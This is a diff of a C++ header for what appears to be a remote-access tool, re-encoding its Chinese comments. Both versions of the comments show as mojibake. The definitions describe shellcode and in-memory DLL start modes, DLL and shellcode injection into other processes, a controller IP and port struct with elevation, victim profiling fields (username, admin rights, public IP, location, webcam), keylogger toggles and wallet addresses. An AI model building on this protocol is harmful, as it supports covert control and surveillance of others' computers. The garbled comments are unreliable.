+    COMMAND_MACHINE_HOSTS, //ä¸èƒ½ä¹±åºå·
 
-    COMMAND_APPUNINSTALL,//Ğ¶ÔØ
-    COMMAND_WINDOW_OPERATE,//´°¿Ú¿ØÖÆ
-    COMMAND_WINDOW_CLOSE,//¹Ø±Õ
-    COMMAND_PROCESS_KILL,//½áÊø½ø³Ì
-    COMMAND_PROCESS_KILLDEL,//½áÊø½ø³Ì----É¾³ı
-    COMMAND_PROCESS_DEL,//Ç¿ÖÆÉ¾³ı ²»ĞèÒª½áÊø½ø³Ì
-    COMMAND_PROCESS_FREEZING,//¶³½á
-    COMMAND_PROCESS_THAW,//½â¶³
+    COMMAND_APPUNINSTALL,//å¸è½½
+    COMMAND_WINDOW_OPERATE,//çª—å£æ§åˆ¶
+    COMMAND_WINDOW_CLOSE,//å…³é—­
+    COMMAND_PROCESS_KILL,//ç»“æŸè¿›ç¨‹
+    COMMAND_PROCESS_KILLDEL,//ç»“æŸè¿›ç¨‹----åˆ é™¤
+    COMMAND_PROCESS_DEL,//å¼ºåˆ¶åˆ é™¤ ä¸éœ€è¦ç»“æŸè¿›ç¨‹
+    COMMAND_PROCESS_FREEZING,//å†»ç»“
+    COMMAND_PROCESS_THAW,//è§£å†»
     COMMAND_HOSTS_SET,//hosts
 
     COMMAND_SERVICE_LIST_WIN32,
@@ -407,7 +407,7 @@ struct  WINDOWSINFO {
     int h;
 };
 
-// Ô¶³Ì½»Ì¸
+// è¿œç¨‹äº¤è°ˆ
 enum ChatManager {
     COMMAND_NEXT_CHAT,
     COMMAND_CHAT_CLOSE,
@@ -415,7 +415,7 @@ enum ChatManager {
     COMMAND_CHAT_SCREEN_UNLOCK,
 };
 
-// ÎÄ¼ş¹ÜÀí
+// æ–‡ä»¶ç®¡ç†
 enum FileManager {
     COMMAND_COMPRESS_FILE_PARAM=220,
     COMMAND_FILES_SEARCH_START,
@@ -458,7 +458,7 @@ enum FileManager {
     TOKEN_FILE_SEARCHPLUS_NUMBER,
 };
 
-// Ô¶³Ì»­°å
+// è¿œç¨‹ç”»æ¿
 enum RemoteDraw {
     CMD_DRAW_POINT = 0,
     CMD_DRAW_END = 1,
@@ -471,19 +471,19 @@ enum RemoteDraw {
 };
 
 enum {
-    CLIENT_TYPE_DLL = 0,			// ¿Í»§¶Ë´úÂëÒÔDLLÔËĞĞ
-    CLIENT_TYPE_ONE = 1,			// ¿Í»§¶Ë´úÂëÒÔµ¥¸öEXEÔËĞĞ
-    CLIENT_TYPE_MEMEXE = -1,		// ÄÚ´æEXEÔËĞĞ
-    CLIENT_TYPE_MODULE = 2,			// DLLĞèÓÉÍâ²¿³ÌĞòµ÷ÓÃ
+    CLIENT_TYPE_DLL = 0,			// å®¢æˆ·ç«¯ä»£ç ä»¥DLLè¿è¡Œ
+    CLIENT_TYPE_ONE = 1,			// å®¢æˆ·ç«¯ä»£ç ä»¥å•ä¸ªEXEè¿è¡Œ
+    CLIENT_TYPE_MEMEXE = -1,		// å†…å­˜EXEè¿è¡Œ
+    CLIENT_TYPE_MODULE = 2,			// DLLéœ€ç”±å¤–éƒ¨ç¨‹åºè°ƒç”¨
     CLIENT_TYPE_SHELLCODE = 4,		// Shellcode
-    CLIENT_TYPE_MEMDLL = 5,			// ÄÚ´æDLLÔËĞĞ
-    CLIENT_TYPE_LINUX = 6,			// LINUX ¿Í»§¶Ë
+    CLIENT_TYPE_MEMDLL = 5,			// å†…å­˜DLLè¿è¡Œ
+    CLIENT_TYPE_LINUX = 6,			// LINUX å®¢æˆ·ç«¯
 };
 
 enum {
-    SHARE_TYPE_YAMA = 0,			// ·ÖÏí¸øÍ¬Àà³ÌĞò
-    SHARE_TYPE_HOLDINGHANDS = 1,	// ·ÖÏí¸ø HoldingHands: https://github.com/yuanyuanxiang/HoldingHands
-    SHARE_TYPE_YAMA_FOREVER = 100,	// ÓÀ¾Ã·ÖÏí
+    SHARE_TYPE_YAMA = 0,			// åˆ†äº«ç»™åŒç±»ç¨‹åº
+    SHARE_TYPE_HOLDINGHANDS = 1,	// åˆ†äº«ç»™ HoldingHands: https://github.com/yuanyuanxiang/HoldingHands
+    SHARE_TYPE_YAMA_FOREVER = 100,	// æ°¸ä¹…åˆ†äº«
 };
 
 inline const char* GetClientType(int typ)
@@ -534,21 +534,21 @@ inline int compareDates(const std::string& date1, const std::string& date2)
         return 0;
     } catch (const std::exception& e) {
         std::cerr << "Date parse error: " << e.what() << std::endl;
-        return -2; // ·µ»ØÌØÊâÖµ±íÊ¾³ö´í
+        return -2; // è¿”å›ç‰¹æ®Šå€¼è¡¨ç¤ºå‡ºé”™
     }
 }
 
-// ´ËÃ¶¾ÙÖµºÍClientTypeÏàËÆ£¬µ«ÓÖ²»ÊÇÍêÈ«Ò»ÖÂ£¬×¨Îª`TestRun`¶¨ÖÆ
-// Ö¸±¾ÖÊÉÏÔËĞĞ`ServerDll`µÄĞÎÊ½
-// `TestRun` Ö»ÓÃÓÚ¼¼ÊõÑĞ¾¿Ä¿µÄ
+// æ­¤æšä¸¾å€¼å’ŒClientTypeç›¸ä¼¼ï¼Œä½†åˆä¸æ˜¯å®Œå…¨ä¸€è‡´ï¼Œä¸“ä¸º`TestRun`å®šåˆ¶
+// æŒ‡æœ¬è´¨ä¸Šè¿è¡Œ`ServerDll`çš„å½¢å¼
+// `TestRun` åªç”¨äºæŠ€æœ¯ç ”ç©¶ç›®çš„
 enum TestRunType {
-    Startup_DLL,			// ´ÅÅÌDLL
-    Startup_MEMDLL,			// ÄÚ´æDLL£¨ÎŞ´ÅÅÌÎÄ¼ş£©
-    Startup_InjDLL,			// Ô¶³Ì×¢Èë DLL£¨×¢ÈëDLLÂ·¾¶£¬ÈÔÒÀÀµ´ÅÅÌDLL£©
-    Startup_Shellcode,		// ±¾µØ Shell code £¨ÔÚµ±Ç°³ÌĞòÖ´ĞĞshell code £©
-    Startup_InjSC,			// Ô¶³Ì Shell code £¨×¢ÈëÆäËû³ÌĞòÖ´ĞĞshell code £©
-    Startup_GhostMsc,       // Windows ·şÎñ
-    Startup_TestRunMsc,     // Windows ·şÎñ
+    Startup_DLL,			// ç£ç›˜DLL
+    Startup_MEMDLL,			// å†…å­˜DLLï¼ˆæ— ç£ç›˜æ–‡ä»¶ï¼‰
+    Startup_InjDLL,			// è¿œç¨‹æ³¨å…¥ DLLï¼ˆæ³¨å…¥DLLè·¯å¾„ï¼Œä»ä¾èµ–ç£ç›˜DLLï¼‰
+    Startup_Shellcode,		// æœ¬åœ° Shell code ï¼ˆåœ¨å½“å‰ç¨‹åºæ‰§è¡Œshell code ï¼‰
+    Startup_InjSC,			// è¿œç¨‹ Shell code ï¼ˆæ³¨å…¥å…¶ä»–ç¨‹åºæ‰§è¡Œshell code ï¼‰
+    Startup_GhostMsc,       // Windows æœåŠ¡
+    Startup_TestRunMsc,     // Windows æœåŠ¡
 };
 
 inline int MemoryFind(const char* szBuffer, const char* Key, int iBufferSize, int iKeySize)
@@ -565,7 +565,7 @@ enum ProtoType {
     PROTO_TCP = 0,					// TCP
     PROTO_UDP = 1,					// UDP
     PROTO_HTTP = 2,					// HTTP
-    PROTO_RANDOM = 3,				// Ëæ»ú
+    PROTO_RANDOM = 3,				// éšæœº
     PROTO_KCP = 4,					// KCP
     PROTO_HTTPS = 5,				// HTTPS
 };
@@ -573,8 +573,8 @@ enum ProtoType {
 #define KCP_SESSION_ID 666
 
 enum RunningType {
-    RUNNING_RANDOM = 0,				// Ëæ»úÉÏÏß
-    RUNNING_PARALLEL = 1,			// ²¢·¢ÉÏÏß
+    RUNNING_RANDOM = 0,				// éšæœºä¸Šçº¿
+    RUNNING_PARALLEL = 1,			// å¹¶å‘ä¸Šçº¿
 };
 
 enum ProtocolEncType {
@@ -590,27 +590,27 @@ enum ClientCompressType {
 };
 
 #pragma pack(push, 4)
-// ËùÁ¬½ÓµÄÖ÷¿Ø³ÌĞòĞÅÏ¢
+// æ‰€è¿æ¥çš„ä¸»æ§ç¨‹åºä¿¡æ¯
 typedef struct CONNECT_ADDRESS {
 public:
-    char	        szFlag[32];		 // ±êÊ¶
-    char			szServerIP[100]; // Ö÷¿ØIP
-    char			szPort[8];		 // Ö÷¿Ø¶Ë¿Ú
-    int				iType;			 // ¿Í»§¶ËÀàĞÍ
-    bool            bEncrypt;		 // ÉÏÏßĞÅÏ¢ÊÇ·ñ¼ÓÃÜ
-    char            szBuildDate[12]; // ¹¹½¨ÈÕÆÚ(°æ±¾)
-    int             iMultiOpen;		 // Ö§³Ö´ò¿ª¶à¸ö
-    int				iStartup;		 // Æô¶¯·½Ê½
-    int				iHeaderEnc;		 // Êı¾İ¼ÓÃÜÀàĞÍ
-    char			protoType;		 // Ğ­ÒéÀàĞÍ
-    char			runningType;	 // ÔËĞĞ·½Ê½
-    char			szGroupName[24]; // ·Ö×éÃû³Æ
-    char            runasAdmin;		 // ÊÇ·ñÌáÉıÈ¨ÏŞÔËĞĞ
-    char            szReserved[11];  // Õ¼Î»£¬Ê¹½á¹¹ÌåÕ¼¾İ300×Ö½Ú
-    uint64_t        clientID;        // ¿Í»§¶ËÎ¨Ò»±êÊ¶
-    uint64_t		parentHwnd;		 // ¸¸½ø³Ì´°¿Ú¾ä±ú
-    uint64_t		superAdmin;		 // ¹ÜÀíÔ±Ö÷¿ØID
-    char			pwdHash[64];	 // ÃÜÂë¹şÏ£
+    char	        szFlag[32];		 // æ ‡è¯†
+    char			szServerIP[100]; // ä¸»æ§IP
+    char			szPort[8];		 // ä¸»æ§ç«¯å£
+    int				iType;			 // å®¢æˆ·ç«¯ç±»å‹
+    bool            bEncrypt;		 // ä¸Šçº¿ä¿¡æ¯æ˜¯å¦åŠ å¯†
+    char            szBuildDate[12]; // æ„å»ºæ—¥æœŸ(ç‰ˆæœ¬)
+    int             iMultiOpen;		 // æ”¯æŒæ‰“å¼€å¤šä¸ª
+    int				iStartup;		 // å¯åŠ¨æ–¹å¼
+    int				iHeaderEnc;		 // æ•°æ®åŠ å¯†ç±»å‹
+    char			protoType;		 // åè®®ç±»å‹
+    char			runningType;	 // è¿è¡Œæ–¹å¼
+    char			szGroupName[24]; // åˆ†ç»„åç§°
+    char            runasAdmin;		 // æ˜¯å¦æå‡æƒé™è¿è¡Œ
+    char            szReserved[11];  // å ä½ï¼Œä½¿ç»“æ„ä½“å æ®300å­—èŠ‚
+    uint64_t        clientID;        // å®¢æˆ·ç«¯å”¯ä¸€æ ‡è¯†
+    uint64_t		parentHwnd;		 // çˆ¶è¿›ç¨‹çª—å£å¥æŸ„
+    uint64_t		superAdmin;		 // ç®¡ç†å‘˜ä¸»æ§ID
+    char			pwdHash[64];	 // å¯†ç å“ˆå¸Œ
 
 public:
     void SetType(int typ)
@@ -715,8 +715,8 @@ public:
 
 #define FOREVER_RUN 2
 
-// ¿Í»§¶Ë³ÌĞòÏß³ÌĞÅÏ¢½á¹¹Ìå, °üº¬5¸ö³ÉÔ±:
-// ÔËĞĞ×´Ì¬(run)¡¢¾ä±ú(h)¡¢Í¨Ñ¶¿Í»§¶Ë(p)¡¢µ÷ÓÃÕß²ÎÊı(user)ºÍÁ¬½ÓĞÅÏ¢(conn).
+// å®¢æˆ·ç«¯ç¨‹åºçº¿ç¨‹ä¿¡æ¯ç»“æ„ä½“, åŒ…å«5ä¸ªæˆå‘˜:
+// è¿è¡ŒçŠ¶æ€(run)ã€å¥æŸ„(h)ã€é€šè®¯å®¢æˆ·ç«¯(p)ã€è°ƒç”¨è€…å‚æ•°(user)å’Œè¿æ¥ä¿¡æ¯(conn).
 struct ThreadInfo {
     int run;
     HANDLE h;
@@ -740,27 +740,27 @@ struct ThreadInfo {
 };
 
 struct PluginParam {
-    char IP[100];			// Ö÷¿ØIP
-    int Port;				// Ö÷¿Ø¶Ë¿Ú
-    const State *Exit;		// ¿Í»§¶Ë×´Ì¬
-    const void* User;		// CONNECT_ADDRESS* Ö¸Õë
+    char IP[100];			// ä¸»æ§IP
+    int Port;				// ä¸»æ§ç«¯å£
+    const State *Exit;		// å®¢æˆ·ç«¯çŠ¶æ€
+    const void* User;		// CONNECT_ADDRESS* æŒ‡é’ˆ
     PluginParam(const char*ip, int port, const State *s, const void* u=0) : Port(port), Exit(s), User(u)
     {
         strcpy_s(IP, ip);
     }
 };
 
-// ½«×Ö·û´®°´Ö¸¶¨×Ö·û·Ö¸ôÎªÏòÁ¿
+// å°†å­—ç¬¦ä¸²æŒ‰æŒ‡å®šå­—ç¬¦åˆ†éš”ä¸ºå‘é‡
 inline std::vector<std::string> StringToVector(const std::string& str, char ch, int reserved = 1)
 {
-    // Ê¹ÓÃ×Ö·û´®Á÷À´·Ö¸ô×Ö·û´®
+    // ä½¿ç”¨å­—ç¬¦ä¸²æµæ¥åˆ†éš”å­—ç¬¦ä¸²
     std::istringstream stream(str);
     std::string item;
     std::vector<std::string> result;
 
-    // °´·ÖºÅ·Ö¸ô×Ö·û´®
+    // æŒ‰åˆ†å·åˆ†éš”å­—ç¬¦ä¸²
     while (std::getline(stream, item, ch)) {
-        result.push_back(item);  // ½«·Ö¸ô³öÀ´µÄ×Ó×Ö·û´®Ìí¼Óµ½½á¹ûÏòÁ¿ÖĞ
+        result.push_back(item);  // å°†åˆ†éš”å‡ºæ¥çš„å­å­—ç¬¦ä¸²æ·»åŠ åˆ°ç»“æœå‘é‡ä¸­
     }
     while (result.size() < reserved)
         result.push_back("");
@@ -769,40 +769,40 @@ inline std::vector<std::string> StringToVector(const std::string& str, char ch, 
 }
 
 enum LOGIN_RES {
-    RES_CLIENT_TYPE = 0,					// ÀàĞÍ
-    RES_SYSTEM_BITS = 1,					// ÏµÍ³Î»Êı
-    RES_SYSTEM_CPU = 2,						// CPUºËÊı
-    RES_SYSTEM_MEM = 3,						// ÏµÍ³ÄÚ´æ
-    RES_FILE_PATH = 4,						// ÎÄ¼şÂ·¾¶
+    RES_CLIENT_TYPE = 0,					// ç±»å‹
+    RES_SYSTEM_BITS = 1,					// ç³»ç»Ÿä½æ•°
+    RES_SYSTEM_CPU = 2,						// CPUæ ¸æ•°
+    RES_SYSTEM_MEM = 3,						// ç³»ç»Ÿå†…å­˜
+    RES_FILE_PATH = 4,						// æ–‡ä»¶è·¯å¾„
     RES_RESVERD = 5,						// ?
-    RES_INSTALL_TIME = 6,					// °²×°Ê±¼ä
-    RES_INSTALL_INFO = 7,					// °²×°ĞÅÏ¢
-    RES_PROGRAM_BITS = 8,					// ³ÌĞòÎ»Êı
-    RES_EXPIRED_DATE = 9,					// µ½ÆÚÈÕÆÚ
-    RES_CLIENT_LOC = 10,					// µØÀíÎ»ÖÃ
-    RES_CLIENT_PUBIP = 11,					// ¹«ÍøµØÖ·
-    RES_EXE_VERSION = 12,					// EXE°æ±¾
-    RES_USERNAME = 13,                      // µçÄÔÓÃ»§Ãû³Æ
-    RES_ISADMIN = 14,                       // ÊÇ·ñ¾ßÓĞ¹ÜÀíÔ±È¨ÏŞ
+    RES_INSTALL_TIME = 6,					// å®‰è£…æ—¶é—´
+    RES_INSTALL_INFO = 7,					// å®‰è£…ä¿¡æ¯
+    RES_PROGRAM_BITS = 8,					// ç¨‹åºä½æ•°
+    RES_EXPIRED_DATE = 9,					// åˆ°æœŸæ—¥æœŸ
+    RES_CLIENT_LOC = 10,					// åœ°ç†ä½ç½®
+    RES_CLIENT_PUBIP = 11,					// å…¬ç½‘åœ°å€
+    RES_EXE_VERSION = 12,					// EXEç‰ˆæœ¬
+    RES_USERNAME = 13,                      // ç”µè„‘ç”¨æˆ·åç§°
+    RES_ISADMIN = 14,                       // æ˜¯å¦å…·æœ‰ç®¡ç†å‘˜æƒé™
     RES_MAX,
 };
 
-// ·şÎñÉÏÏßºó·¢ËÍµÄ¼ÆËã»úĞÅÏ¢
-// ´Ë½á¹¹ÌåÒ»µ©·¢Éú±ä»¯£¨±ÈÈç´óĞ¡£©£¬ÔòÒÔÇ°°æ±¾µÄ¿Í»§¶ËÎŞ·¨Á¬½ÓĞÂ°æÖ÷¿Ø.
-// ĞÂ°æ¿Í»§¶ËÒ²ÎŞ·¨Á¬½ÓÀÏ°æ±¾µÄÖ÷¿Ø³ÌĞò.
-// Îª´Ë£¬×Ô20241228Ìá½»ÒÔÀ´£¬ÎªÕâ¸ö½á¹¹ÌåÔ¤Áô×Ö¶Î£¬ÒÔ±ãÎ´À´Ö®²»Ê±Ö®Ğè
-// ÇëÎğÔÙĞŞ¸Ä´Ë½á¹¹Ìå£¬³ı·ÇÄã¾ö¶¨²»ÔÙ¼æÈİÒÔÇ°µÄ³ÌĞò»òÕßµ¥¶À±àĞ´´úÂëÀ´¼æÈİ
+// æœåŠ¡ä¸Šçº¿åå‘é€çš„è®¡ç®—æœºä¿¡æ¯
+// æ­¤ç»“æ„ä½“ä¸€æ—¦å‘ç”Ÿå˜åŒ–ï¼ˆæ¯”å¦‚å¤§å°ï¼‰ï¼Œåˆ™ä»¥å‰ç‰ˆæœ¬çš„å®¢æˆ·ç«¯æ— æ³•è¿æ¥æ–°ç‰ˆä¸»æ§.
+// æ–°ç‰ˆå®¢æˆ·ç«¯ä¹Ÿæ— æ³•è¿æ¥è€ç‰ˆæœ¬çš„ä¸»æ§ç¨‹åº.
+// ä¸ºæ­¤ï¼Œè‡ª20241228æäº¤ä»¥æ¥ï¼Œä¸ºè¿™ä¸ªç»“æ„ä½“é¢„ç•™å­—æ®µï¼Œä»¥ä¾¿æœªæ¥ä¹‹ä¸æ—¶ä¹‹éœ€
+// è¯·å‹¿å†ä¿®æ”¹æ­¤ç»“æ„ä½“ï¼Œé™¤éä½ å†³å®šä¸å†å…¼å®¹ä»¥å‰çš„ç¨‹åºæˆ–è€…å•ç‹¬ç¼–å†™ä»£ç æ¥å…¼å®¹
 typedef struct  LOGIN_INFOR {
-    unsigned char			bToken;									// 1.µÇÂ½ĞÅÏ¢
-    char					OsVerInfoEx[156];						// 2.°æ±¾ĞÅÏ¢
-    unsigned int			dwCPUMHz;								// 3.CPUÖ÷Æµ
-    char					moduleVersion[24];						// 4.DLLÄ£¿é°æ±¾
-    char					szPCName[240];							// 5.Ö÷»úÃû
-    char					szMasterID[20];							// 5.1 Ö÷¿ØID
-    int						bWebCamIsExist;							// 6.ÊÇ·ñÓĞÉãÏñÍ·
-    unsigned int			dwSpeed;								// 7.ÍøËÙ
-    char					szStartTime[20];						// 8.Æô¶¯Ê±¼ä
-    char					szReserved[512];						// 9.±£Áô×Ö¶Î
+    unsigned char			bToken;									// 1.ç™»é™†ä¿¡æ¯
+    char					OsVerInfoEx[156];						// 2.ç‰ˆæœ¬ä¿¡æ¯
+    unsigned int			dwCPUMHz;								// 3.CPUä¸»é¢‘
+    char					moduleVersion[24];						// 4.DLLæ¨¡å—ç‰ˆæœ¬
+    char					szPCName[240];							// 5.ä¸»æœºå
+    char					szMasterID[20];							// 5.1 ä¸»æ§ID
+    int						bWebCamIsExist;							// 6.æ˜¯å¦æœ‰æ‘„åƒå¤´
+    unsigned int			dwSpeed;								// 7.ç½‘é€Ÿ
+    char					szStartTime[20];						// 8.å¯åŠ¨æ—¶é—´
+    char					szReserved[512];						// 9.ä¿ç•™å­—æ®µ
 
     LOGIN_INFOR()
     {
@@ -854,7 +854,7 @@ inline uint64_t GetUnixMs()
     return system_ms.time_since_epoch().count();
 }
 
-// ¹Ì¶¨1024×Ö½Ú
+// å›ºå®š1024å­—èŠ‚
 typedef struct Heartbeat {
     uint64_t Time;
     char ActiveWnd[512];
@@ -888,13 +888,13 @@ typedef struct HeartbeatACK {
     char Reserved[23];
 } HeartbeatACK;
 
-// ¹Ì¶¨500×Ö½Ú
+// å›ºå®š500å­—èŠ‚
 typedef struct MasterSettings {
-    int         ReportInterval;             // ÉÏ±¨¼ä¸ô
-    int         Is64Bit;                    // Ö÷¿ØÊÇ·ñ64Î»
-    char        MasterVersion[12];          // Ö÷¿Ø°æ±¾
-    int			DetectSoftware;				// ¼ì²âÈí¼ş
-    int			UsingFRPProxy;				// ÊÇ·ñÊ¹ÓÃFRP´úÀí
+    int         ReportInterval;             // ä¸ŠæŠ¥é—´éš”
+    int         Is64Bit;                    // ä¸»æ§æ˜¯å¦64ä½
+    char        MasterVersion[12];          // ä¸»æ§ç‰ˆæœ¬
+    int			DetectSoftware;				// æ£€æµ‹è½¯ä»¶
+    int			UsingFRPProxy;				// æ˜¯å¦ä½¿ç”¨FRPä»£ç†
     char		WalletAddress[472];			// Wallets
     int         EnableKBLogger;             // Since 2025-11-27
     int         EnableLog;                  // Since 2025-12-17
@@ -904,26 +904,26 @@ typedef struct MasterSettings {
 #define MasterSettingsOldSize 500
 
 #pragma pack(push, 1)
-// 100×Ö½Ú: ÔËĞĞÀàĞÍ + ´óĞ¡ + µ÷ÓÃ·½Ê½ + DLLÃû³Æ
+// 100å­—èŠ‚: è¿è¡Œç±»å‹ + å¤§å° + è°ƒç”¨æ–¹å¼ + DLLåç§°
 typedef struct DllExecuteInfo {
-    int RunType;							// ÔËĞĞÀàĞÍ
-    int Size;								// DLL ´óĞ¡
-    int CallType;							// µ÷ÓÃ·½Ê½
-    char Name[32];							// DLL Ãû³Æ
+    int RunType;							// è¿è¡Œç±»å‹
+    int Size;								// DLL å¤§å°
+    int CallType;							// è°ƒç”¨æ–¹å¼
+    char Name[32];							// DLL åç§°
     char Md5[33];							// DLL MD5
-    int Pid;                                // ±»×¢Èë½ø³ÌID
-    char Is32Bit;                           // ÊÇ·ñ32Î»DLL
+    int Pid;                                // è¢«æ³¨å…¥è¿›ç¨‹ID
+    char Is32Bit;                           // æ˜¯å¦32ä½DLL
     char Reseverd[18];
 } DllExecuteInfo;
 
 typedef struct DllExecuteInfoNew {
-	int RunType;							// ÔËĞĞÀàĞÍ
-	int Size;								// DLL ´óĞ¡
-	int CallType;							// µ÷ÓÃ·½Ê½
-	char Name[32];							// DLL Ãû³Æ
+	int RunType;							// è¿è¡Œç±»å‹
+	int Size;								// DLL å¤§å°
+	int CallType;							// è°ƒç”¨æ–¹å¼
+	char Name[32];							// DLL åç§°
 	char Md5[33];							// DLL MD5
-	int Pid;                                // ±»×¢Èë½ø³ÌID
-	char Is32Bit;                           // ÊÇ·ñ32Î»DLL
+	int Pid;                                // è¢«æ³¨å…¥è¿›ç¨‹ID
+	char Is32Bit;                           // æ˜¯å¦32ä½DLL
 	char Reseverd[18];
     char Parameters[400];
 } DllExecuteInfoNew;
@@ -956,9 +956,9 @@ enum {
     SHELLCODE = 0,
     MEMORYDLL = 1,
 
-    CALLTYPE_DEFAULT = 0,		// Ä¬ÈÏµ÷ÓÃ·½Ê½: Ö»ÊÇ¼ÓÔØDLL,ĞèÒªÔÚDLL¼ÓÔØÊ±Ö´ĞĞ´úÂë
-    CALLTYPE_IOCPTHREAD = 1,	// µ÷ÓÃrunº¯ÊıÆô¶¯Ïß³Ì: DWORD (__stdcall *run)(void* lParam)
-    CALLTYPE_FRPC_CALL = 2,     // µ÷ÓÃFRPC
+    CALLTYPE_DEFAULT = 0,		// é»˜è®¤è°ƒç”¨æ–¹å¼: åªæ˜¯åŠ è½½DLL,éœ€è¦åœ¨DLLåŠ è½½æ—¶æ‰§è¡Œä»£ç 
+    CALLTYPE_IOCPTHREAD = 1,	// è°ƒç”¨runå‡½æ•°å¯åŠ¨çº¿ç¨‹: DWORD (__stdcall *run)(void* lParam)
+    CALLTYPE_FRPC_CALL = 2,     // è°ƒç”¨FRPC
 };
 
 typedef DWORD(__stdcall* PidCallback)(void);
@@ -985,26 +985,26 @@ inline void xor_encrypt_decrypt(unsigned char *data, int len, const std::vector<
 
 inline std::tm ToPekingTime(const time_t* t)
 {
-    // »ñÈ¡µ±Ç°Ê±¼ä£¨Èç¹û´«ÈëµÄÖ¸ÕëÎª¿Õ£©
+    // è·å–å½“å‰æ—¶é—´ï¼ˆå¦‚æœä¼ å…¥çš„æŒ‡é’ˆä¸ºç©ºï¼‰
     std::time_t now = (t == nullptr) ? std::time(nullptr) : *t;
 
-    // Ïß³Ì°²È«µØ×ª»»Îª UTC Ê±¼ä
+    // çº¿ç¨‹å®‰å…¨åœ°è½¬æ¢ä¸º UTC æ—¶é—´
     std::tm utc_time{};
 
-#ifdef _WIN32  // Windows Ê¹ÓÃ gmtime_s
+#ifdef _WIN32  // Windows ä½¿ç”¨ gmtime_s
     if (gmtime_s(&utc_time, &now) != 0) {
-        return { 0, 0, 0, 1, 0, 100 }; // Ê§°ÜÊ±·µ»Ø 2000-01-01 00:00:00
+        return { 0, 0, 0, 1, 0, 100 }; // å¤±è´¥æ—¶è¿”å› 2000-01-01 00:00:00
     }
-#else  // Linux / macOS Ê¹ÓÃ gmtime_r
+#else  // Linux / macOS ä½¿ç”¨ gmtime_r
     if (gmtime_r(&now, &utc_time) == nullptr) {
         return { 0, 0, 0, 1, 0, 100 };
     }
 #endif
 
-    // ×ª»»Îª±±¾©Ê±¼ä£¨UTC+8£©
+    // è½¬æ¢ä¸ºåŒ—äº¬æ—¶é—´ï¼ˆUTC+8ï¼‰
     utc_time.tm_hour += 8;
 
-    // ¹æ·¶»¯Ê±¼ä£¨´¦ÀíÒç³ö£¬Èç¿çÌì£©
+    // è§„èŒƒåŒ–æ—¶é—´ï¼ˆå¤„ç†æº¢å‡ºï¼Œå¦‚è·¨å¤©ï¼‰
     std::mktime(&utc_time);
 
     return utc_time;
@@ -1027,11 +1027,11 @@ inline std::string ToPekingDateTime(const time_t* t)
 }
 
 typedef struct Validation {
-    char From[20];			// ¿ªÊ¼ÈÕÆÚ
-    char To[20];			// ½áÊøÈÕÆÚ
-    char Admin[100];		// ¹ÜÀíÔ±µØÖ·£¨µ±Ç°Ö÷¿ØµÄ¹«ÍøµØÖ·£©
-    int Port;				// ¹ÜÀíÔ±¶Ë¿Ú£¨Ä¬ÈÏµ±Ç°¶Ë¿Ú£©
-    char Checksum[16];		// Ô¤Áô×Ö¶Î
+    char From[20];			// å¼€å§‹æ—¥æœŸ
+    char To[20];			// ç»“æŸæ—¥æœŸ
+    char Admin[100];		// ç®¡ç†å‘˜åœ°å€ï¼ˆå½“å‰ä¸»æ§çš„å…¬ç½‘åœ°å€ï¼‰
+    int Port;				// ç®¡ç†å‘˜ç«¯å£ï¼ˆé»˜è®¤å½“å‰ç«¯å£ï¼‰
+    char Checksum[16];		// é¢„ç•™å­—æ®µ
     Validation(float days, const char* admin, int port, const char* id="")
     {
         time_t from = time(NULL), to = from + time_t(86400 * days);
@@ -1052,7 +1052,7 @@ typedef struct Validation {
 } Validation;
 
 #ifdef _DEBUG
-// ÎªÁË½â¾öÔ¶³Ì×ÀÃæÆÁÄ»»¨ÆÁÎÊÌâ¶ø¶¨ÒåµÄºê£¬½öµ÷ÊÔÊ±Ê¹ÓÃ£¬ÕıÊ½°æ±¾Ã»ÓĞ
+// ä¸ºäº†è§£å†³è¿œç¨‹æ¡Œé¢å±å¹•èŠ±å±é—®é¢˜è€Œå®šä¹‰çš„å®ï¼Œä»…è°ƒè¯•æ—¶ä½¿ç”¨ï¼Œæ­£å¼ç‰ˆæœ¬æ²¡æœ‰
 #define SCREENYSPY_IMPROVE 0
 #define SCREENSPY_WRITE 0
 #endif
@@ -1066,7 +1066,7 @@ typedef struct Validation {
 #include <windows.h>
 #endif
 
-// ½«ÄÚ´æÖĞµÄÎ»Í¼Ğ´ÈëÎÄ¼ş
+// å°†å†…å­˜ä¸­çš„ä½å›¾å†™å…¥æ–‡ä»¶
 inline bool WriteBitmap(LPBITMAPINFO bmpInfo, const void* bmpData, const std::string& filePrefix, int index = -1)
 {
     char path[_MAX_PATH];
@@ -1091,7 +1091,7 @@ inline bool WriteBitmap(LPBITMAPINFO bmpInfo, const void* bmpData, const std::st
     return false;
 }
 
-class MSG32   // ×Ô¶¨Òå¿ØÖÆÏûÏ¢(32Î»)
+class MSG32   // è‡ªå®šä¹‰æ§åˆ¶æ¶ˆæ¯(32ä½)
 {
 public:
     uint32_t            hwnd;
@@ -1126,9 +1126,9 @@ public:
     }
 };
 
-// Windows ×Ô¶¨ÒåµÄÏûÏ¢MSGÔÚ32Î»ºÍ64Î»ÏµÍ³ÏÂ´óĞ¡²»Í¬£¬µ¼ÖÂ¿çÆ½Ì¨¼Ü¹¹Ô¶³Ì¿ØÖÆÒì³£
-// ĞèÒªÊ¹ÓÃ×Ô¶¨ÒåµÄÏûÏ¢(Í³Ò»²ÉÓÃ64Î»windows µÄMSG¶¨Òå)
-class MSG64   // ×Ô¶¨Òå¿ØÖÆÏûÏ¢(64Î»)
+// Windows è‡ªå®šä¹‰çš„æ¶ˆæ¯MSGåœ¨32ä½å’Œ64ä½ç³»ç»Ÿä¸‹å¤§å°ä¸åŒï¼Œå¯¼è‡´è·¨å¹³å°æ¶æ„è¿œç¨‹æ§åˆ¶å¼‚å¸¸
+// éœ€è¦ä½¿ç”¨è‡ªå®šä¹‰çš„æ¶ˆæ¯(ç»Ÿä¸€é‡‡ç”¨64ä½windows çš„MSGå®šä¹‰)
+class MSG64   // è‡ªå®šä¹‰æ§åˆ¶æ¶ˆæ¯(64ä½)
 {
 public:
     uint64_t            hwnd;
@@ -1203,7 +1203,7 @@ typedef struct ClientMsg {
     ClientMsg(const char* title, const char* text)
     {
         cmd = TOKEN_CLIENT_MSG;
-        strcpy_s(this->title, title ? title : "ÌáÊ¾ĞÅÏ¢");
+        strcpy_s(this->title, title ? title : "æç¤ºä¿¡æ¯");
         strcpy_s(this->text, text ? text : "");
     }
 } ClientMsg;
